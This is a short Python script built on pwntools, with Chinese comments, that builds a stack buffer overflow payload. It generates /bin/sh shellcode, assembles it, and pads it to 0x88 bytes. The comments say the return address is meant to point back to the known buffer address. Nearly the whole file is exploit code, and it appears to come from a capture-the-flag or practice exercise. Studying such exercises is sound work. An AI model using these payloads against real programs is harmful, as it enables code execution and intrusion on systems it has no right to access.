# -*- coding: UTF-8 -*-
from pwn import *

# 生成一段标准shellcode
asmcode = shellcraft.sh()
print("sh==>", asmcode)

opcode = asm(asmcode) + b'\x00'
print("asm==>", opcode, len(opcode))

# 由于buf被填充为shellcode，且buf地址已知，因此可以让程序跳到buf执行shellcode
#         shelloce后面填充'a'           ebp     返回地址为buf的地址
payload = opcode.ljust(0x88, b'a')
print("payload==>", payload, hex(len(payload)))
